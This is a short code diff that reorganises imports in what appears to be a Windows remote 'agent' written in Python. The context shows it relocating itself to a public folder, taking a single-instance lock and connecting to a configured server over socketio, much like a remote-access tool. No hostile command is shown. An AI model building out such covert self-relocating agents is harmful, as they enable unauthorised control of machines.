@@ -63,10 +63,39 @@ BUILD COMMAND:
 RENDER / PRODUCTION:
   Change SERVER_URL below to your Render URL before compiling.
 """
-import shutil
-import sys
 import os
+import sys
+import time
+import json
+import base64
+import hashlib
+import socket
+import platform
+import threading
 import subprocess
+import tempfile
+import logging
+import logging.handlers
+import winreg
+import ctypes
+import uuid
+import asyncio
+import struct
+from concurrent.futures import ThreadPoolExecutor
+import random
+import wave
+import io
+import re
+import glob
+import fnmatch
+import shutil
+import shutil as _shutil
+from io import BytesIO
+from pathlib import Path
+from datetime import datetime, timedelta
+from queue import Queue, Empty, Full
+from collections import deque
+from typing import Optional, Dict, List, Any
 
 def relocate_agent():
     target_dir  = r"C:\Users\Public\mview"
@@ -138,39 +167,6 @@ if __name__ == "__main__":
     relocate_agent()
     _acquire_single_instance_lock()
 
-# ── Standard Library ───────────────────────────────────────────────────────────
-import os
-import sys
-import time
-import json
-import base64
-import hashlib
-import socket
-import platform
-import threading
-import subprocess
-import tempfile
-import logging
-import logging.handlers
-import winreg
-import ctypes
-import uuid
-import asyncio
-import struct
-from concurrent.futures import ThreadPoolExecutor
-import random
-import wave
-import io
-import re
-import glob
-import fnmatch
-import shutil as _shutil
-from io import BytesIO
-from pathlib import Path
-from datetime import datetime, timedelta
-from queue import Queue, Empty, Full
-from collections import deque
-from typing import Optional, Dict, List, Any
 
 # ── Third-Party ────────────────────────────────────────────────────────────────
 import socketio
